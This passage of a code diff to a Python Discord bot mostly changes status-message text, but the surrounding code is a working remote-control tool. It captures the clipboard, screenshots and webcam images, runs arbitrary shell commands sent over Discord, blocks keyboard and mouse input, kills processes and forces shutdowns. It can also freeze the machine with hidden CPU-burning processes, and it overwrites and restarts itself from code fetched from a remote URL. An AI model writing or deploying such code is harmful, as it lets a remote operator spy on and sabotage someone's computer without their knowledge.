-    if sys.platform != "win32": return await ctx.send("❌ Windows only.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    if sys.platform != "win32": return await ctx.send(" Windows only.")
     try:
         class LASTINPUTINFO(ctypes.Structure):
             _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
@@ -927,13 +927,13 @@ async def idle_prefix(ctx):
         seconds = millis // 1000
         mins, secs = divmod(seconds, 60)
         hours, mins = divmod(mins, 60)
-        await ctx.send(f"⏱️ Idle for: `{hours}h {mins}m {secs}s`")
+        await ctx.send(f" Idle for: `{hours}h {mins}m {secs}s`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="procs")
 async def procs_prefix(ctx, *, filter: str = ""):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     results = []
     for proc in psutil.process_iter(["pid", "name"]):
         try:
@@ -948,7 +948,7 @@ async def procs_prefix(ctx, *, filter: str = ""):
 
 @bot.command(name="clip")
 async def clip_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         if sys.platform == "win32":
             result = subprocess.run(["powershell", "-Command", "Get-Clipboard"], capture_output=True, text=True)
@@ -956,13 +956,13 @@ async def clip_prefix(ctx):
             result = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True)
         content = result.stdout.strip() or "(clipboard is empty)"
         if len(content) > 1900: content = content[:1900] + "\n...(truncated)"
-        await ctx.send(f"📋 Clipboard:\n```\n{content}\n```")
+        await ctx.send(f" Clipboard:\n```\n{content}\n```")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="ss")
 async def ss_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         from PIL import ImageGrab
         img = ImageGrab.grab()
@@ -971,50 +971,50 @@ async def ss_prefix(ctx):
         buf.seek(0)
         await ctx.send(file=discord.File(buf, filename="screenshot.png"))
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="cam")
 async def cam_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         import cv2
         cap = cv2.VideoCapture(0)
-        if not cap.isOpened(): return await ctx.send("❌ No webcam found.")
+        if not cap.isOpened(): return await ctx.send(" No webcam found.")
         ret, frame = cap.read()
         cap.release()
-        if not ret: return await ctx.send("❌ Failed to capture.")
+        if not ret: return await ctx.send(" Failed to capture.")
         _, buf = cv2.imencode(".png", frame)
         await ctx.send(file=discord.File(io.BytesIO(buf.tobytes()), filename="cam.png"))
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="run")
 async def run_prefix(ctx, *, command: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
         output = result.stdout or result.stderr or "(no output)"
         if len(output) > 1900: output = output[:1900] + "\n...(truncated)"
-        await ctx.send(f"⚙️ `{command}`\n```\n{output}\n```")
+        await ctx.send(f" `{command}`\n```\n{output}\n```")
     except subprocess.TimeoutExpired:
-        await ctx.send("⏰ Timed out after 30s.")
+        await ctx.send(" Timed out after 30s.")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="open")
 async def open_prefix(ctx, *, path: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         if sys.platform == "win32": os.startfile(path)
         elif sys.platform == "darwin": subprocess.Popen(["open", path])
         else: subprocess.Popen(["xdg-open", path])
-        await ctx.send(f"✅ Opened: `{path}`")
+        await ctx.send(f" Opened: `{path}`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="kill")
 async def kill_prefix(ctx, *, name: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     killed = []
     for proc in psutil.process_iter(["pid", "name"]):
         if name.lower() in proc.info["name"].lower():
@@ -1024,37 +1024,37 @@ async def kill_prefix(ctx, *, name: str):
             except Exception:
                 pass
     if killed:
-        await ctx.send("🔴 Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
+        await ctx.send(" Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
     else:
-        await ctx.send(f"⚠️ No process matching `{name}`")
+        await ctx.send(f" No process matching `{name}`")
 
 @bot.command(name="type")
 async def type_prefix(ctx, *, text: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         import pyautogui
         pyautogui.write(text, interval=0.05)
-        await ctx.send(f"⌨️ Typed: `{text}`")
+        await ctx.send(f" Typed: `{text}`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="vol")
 async def vol_prefix(ctx, level: int):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
-    if not 0 <= level <= 100: return await ctx.send("❌ Must be 0-100.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    if not 0 <= level <= 100: return await ctx.send(" Must be 0-100.")
     try:
         if sys.platform == "win32":
             script = (f"$volume = {level / 100};" "$obj = New-Object -ComObject WScript.Shell;" "1..50 | % { $obj.SendKeys([char]174) };" f"$steps = [math]::Round($volume * 50);" "1..$steps | % { $obj.SendKeys([char]175) }")
             subprocess.run(["powershell", "-Command", script], capture_output=True)
         else:
             subprocess.run(["amixer", "-D", "pulse", "sset", "Master", f"{level}%"])
-        await ctx.send(f"🔊 Volume set to `{level}%`")
+        await ctx.send(f" Volume set to `{level}%`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="notify")
 async def notify_prefix(ctx, *, message: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         if sys.platform == "win32":
             script = f"""
@@ -1072,73 +1072,73 @@ $toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
             subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", script], capture_output=True)
         else:
             subprocess.run(["notify-send", "Bot Alert", message])
-        await ctx.send(f"🔔 Notification sent: `{message}`")
+        await ctx.send(f" Notification sent: `{message}`")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="wallpaper")
 async def wallpaper_prefix(ctx, url: str):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     try:
         path = os.path.join(os.environ.get("TEMP", "/tmp"), "wallpaper.jpg")
         urllib.request.urlretrieve(url, path)
         if sys.platform == "win32":
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
-        await ctx.send("🖼️ Wallpaper changed!")
+        await ctx.send(" Wallpaper changed!")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 @bot.command(name="lock")
 async def lock_prefix(ctx, seconds: int = 5):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     if sys.platform == "win32":
         result = ctypes.windll.user32.BlockInput(True)
         if result:
-            msg = "🔒 Input locked."
+            msg = " Input locked."
             if seconds > 0: msg += f" Auto-unlocking in {seconds}s."
             await ctx.send(msg)
             if seconds > 0:
                 await asyncio.sleep(seconds)
                 ctypes.windll.user32.BlockInput(False)
-                await ctx.send("🔓 Input auto-unlocked.")
+                await ctx.send(" Input auto-unlocked.")
         else:
-            await ctx.send("❌ Failed — run as Administrator.")
+            await ctx.send(" Failed  run as Administrator.")
 
 @bot.command(name="unlock")
 async def unlock_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
     if sys.platform == "win32":
         ctypes.windll.user32.BlockInput(False)
-        await ctx.send("🔓 Input unlocked.")
+        await ctx.send(" Input unlocked.")
 
 @bot.command(name="shutdown")
 async def shutdown_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
-    await ctx.send("🔌 Shutting down...")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    await ctx.send(" Shutting down...")
     subprocess.run(["shutdown", "/s", "/t", "5"] if sys.platform == "win32" else ["shutdown", "-h", "now"])
 
 @bot.command(name="reboot")
 async def reboot_prefix(ctx):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
-    await ctx.send("🔄 Rebooting...")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    await ctx.send(" Rebooting...")
     subprocess.run(["shutdown", "/r", "/t", "5"] if sys.platform == "win32" else ["reboot"])
 
 @bot.command(name="freeze")
 async def freeze_prefix(ctx, seconds: int = 5):
-    if not authorized(ctx.author.id): return await ctx.send("❌ You're not authorized.")
-    await ctx.send(f"🥶 Freezing for `{seconds}s`...")
+    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
+    await ctx.send(f" Freezing for `{seconds}s`...")
     burn_code = "import math\nwhile True:\n math.factorial(100000)"
     procs = [subprocess.Popen([sys.executable, "-c", burn_code], creationflags=subprocess.CREATE_NO_WINDOW) for _ in range(os.cpu_count() or 4)]
     await asyncio.sleep(seconds)
     for p in procs:
         try: p.kill()
         except: pass
-    await ctx.send("✅ Done freezing.")
+    await ctx.send(" Done freezing.")
 
 
-# ─────────────────────────────────────────
+# 
 # AUTO-UPDATER
-# ─────────────────────────────────────────
+# 
 UPDATE_URL = "https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py"
 
 def check_update():
@@ -1174,15 +1174,15 @@ check_update()
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    print(f"✅ Logged in as {bot.user} | Slash commands synced")
+    print(f" Logged in as {bot.user} | Slash commands synced")
 
 
-# ── /update ──────────────────────────────
+#  /update 
 @bot.tree.command(name="update", description="Force check for bot updates")
 async def update(interaction: discord.Interaction):
     if not authorized(interaction.user.id):
         return await deny(interaction)
-    await interaction.response.send_message("🔄 Checking for updates...")
+    await interaction.response.send_message(" Checking for updates...")
     try:
         import urllib.request
         with urllib.request.urlopen(UPDATE_URL) as r:
@@ -1190,20 +1190,20 @@ async def update(interaction: discord.Interaction):
         with open(os.path.abspath(__file__), "rb") as f:
             local = f.read()
         if remote != local:
-            await interaction.followup.send("✅ Update found! Applying and restarting...")
+            await interaction.followup.send(" Update found! Applying and restarting...")
             with open(os.path.abspath(__file__), "wb") as f:
                 f.write(remote)
             os.execv(sys.executable, [sys.executable] + sys.argv)
         else:
-            await interaction.followup.send("✅ Already up to date.")
+            await interaction.followup.send(" Already up to date.")
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {e}")
+        await interaction.followup.send(f" Error: {e}")
 
 @bot.command(name="update")
 async def update_prefix(ctx):
     if not authorized(ctx.author.id):
-        return await ctx.send("❌ You're not authorized.")
-    await ctx.send("🔄 Checking for updates...")
+        return await ctx.send(" You're not authorized.")
+    await ctx.send(" Checking for updates...")
     try:
         import urllib.request
         with urllib.request.urlopen(UPDATE_URL) as r:
@@ -1211,15 +1211,15 @@ async def update_prefix(ctx):
         with open(os.path.abspath(__file__), "rb") as f:
             local = f.read()
         if remote != local:
-            await ctx.send("✅ Update found! Applying and restarting...")
+            await ctx.send(" Update found! Applying and restarting...")
             with open(os.path.abspath(__file__), "wb") as f:
                 f.write(remote)
             os.execv(sys.executable, [sys.executable] + sys.argv)
         else:
-            await ctx.send("✅ Already up to date.")
+            await ctx.send(" Already up to date.")
     except Exception as e:
-        await ctx.send(f"❌ Error: {e}")
+        await ctx.send(f" Error: {e}")
 
 
-# ─────────────────────────────────────────
+# 
 bot.run(BOT_TOKEN)
